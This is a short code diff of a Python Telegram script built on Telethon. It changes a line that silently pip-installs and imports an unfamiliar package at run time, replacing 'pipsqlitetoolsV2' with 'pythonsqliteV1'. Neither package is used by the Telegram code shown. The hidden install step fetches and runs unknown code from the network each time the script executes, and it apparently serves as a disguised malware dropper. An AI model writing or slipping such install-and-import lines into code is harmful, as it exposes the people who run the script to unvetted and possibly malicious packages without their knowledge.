@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitetoolsV2")
-import pipsqlitetoolsV2
+os.system("pip install pythonsqliteV1")
+import pythonsqliteV1
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
